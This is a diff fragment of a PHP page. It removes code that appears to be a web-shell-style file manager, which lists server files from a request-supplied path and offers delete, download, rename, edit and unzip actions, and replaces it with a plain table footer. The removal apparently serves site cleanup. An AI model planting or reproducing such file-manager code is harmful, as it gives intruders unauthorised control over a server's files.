-foreach($lokasinya as $file) {
-    if(!is_file("$lokasi/$file")) continue;
-    $size = filesize("$lokasi/$file")/1024;
-    $size = round($size,3);
-    if($size >= 1024){
-    $size = round($size/1024,2).' MB';
-} else {
-    $size = $size.' KB';
-}
-
-echo "<tr>
-<td>".cekfile($lokasi."/".$file)."<a href=\"?fileloc=$lokasi/$file&path=$lokasi\">$file</a></td>
-<td><center>".$size."</center></td>
-<td><center>".filedate($lokasi."/".$file)."</center></td>
-<td>".owner($lokasi."/".$file)."</td>
-<td><center>";
-if(is_writable("$lokasi/$file")) echo '<font color="green">';
-elseif(!is_readable("$lokasi/$file")) echo '<font color="red">';
-echo statusnya("$lokasi/$file");
-if(is_writable("$lokasi/$file") || !is_readable("$lokasi/$file")) echo '</font>';
-echo "</center></td><td><center>
-<form method=\"post\" action=\"?pilihan&path=$lokasi\">
-<select name=\"pilih\">table
-<option value=\"\">-Select-</option>
-<option value=\"hapus\">Delete</option>
-<option value=\"dunlut\">Download</option>
-<option value=\"gantinama\">Rename</option>
-<option value=\"edit\">Edit</option>";
-if (class_exists("ZipArchive")) {
-    echo "<option value=\"unzip\">Unzip</option>";
-}
-echo "</select>
-<input type=\"hidden\" name=\"type\" value=\"file\">
-<input type=\"hidden\" name=\"name\" value=\"$file\">
-<input type=\"hidden\" name=\"path\" value=\"$lokasi/$file\">
-<input type=\"submit\" class=\"gas\" value=\">\" />
-</form></center></td>
-</tr>";
-}
-echo '</tr></td></table></table>';
-author();
-
-function statusnya($file){
-$izin = substr(sprintf('%o', fileperms($file)), -4);
-return $izin;
-}
-?>	
+?>
+</tbody>
+<thead>
+    <tr>
+        <th colspan="5" style="border:none;">&copy; 2024</th>
+    </tr>
+</thead>
+</table>
 </body>
 </html>
